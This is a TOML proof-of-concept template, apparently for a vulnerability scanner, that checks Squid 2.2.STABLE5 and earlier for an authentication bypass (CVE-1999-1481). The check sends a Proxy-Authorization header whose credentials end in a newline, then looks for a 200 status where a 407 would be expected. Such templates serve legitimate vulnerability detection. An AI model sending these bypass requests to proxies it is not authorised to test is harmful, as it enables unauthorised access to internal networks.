[info]
author = "ave"
description = "Squid 2.2.STABLE5及更早版本在使用外部认证时，未过滤Proxy-Authorization头中base64解码后的换行符，导致认证响应错位，攻击者可利用此漏洞绕过代理访问控制。向代理发送带有换行符的认证凭据，检测代理返回状态是否为200而非407。"
id = "POC-AVE-1999-1128"
name = "Squid Web Proxy 身份验证绕过漏洞 PoC"
severity = "medium"
tags = ["ave-1999-1128"]
vuln_id = [
    "CVE-1999-1481",
    "AVE-1999-1128",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.headers]
Host = "internal-target.com"
Proxy-Authorization = "Basic Zm9vOmJhcgo="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
